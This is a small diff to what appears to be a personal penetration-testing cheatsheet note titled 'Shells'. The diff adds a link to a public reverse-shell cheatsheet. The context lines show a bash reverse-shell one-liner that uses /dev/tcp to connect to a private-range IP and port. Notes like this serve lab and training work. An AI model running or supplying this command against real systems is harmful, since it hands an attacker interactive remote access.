@@ -2,6 +2,7 @@
 sticker: emoji//1f41a
 ---
 #### Shells
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
 ##### Bash
 ```
 bash -c "bash -i >& /dev/tcp/192.168.45.161/1443 0>&1"
